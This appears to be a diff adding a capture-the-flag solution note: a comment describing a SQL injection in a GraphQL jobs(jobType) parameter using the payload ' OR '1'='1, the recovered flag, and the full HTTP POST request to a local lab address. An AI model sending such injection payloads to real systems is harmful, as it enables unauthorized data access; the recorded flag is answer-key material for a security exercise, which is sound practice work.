@@ -1,0 +1,8 @@
+# SQLi in jobs(jobType) parameter. Payload ' OR '1'='1 bypasses filter and returns all rows including hidden job with CTF flag: flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}
+
+POST /graphql HTTP/1.1
+Host: 172.17.0.1:54879
+Content-Type: application/json
+Content-Length: 76
+
+{"query": "{ jobs(jobType: \"' OR '1'='1\") { id name type description } }"}
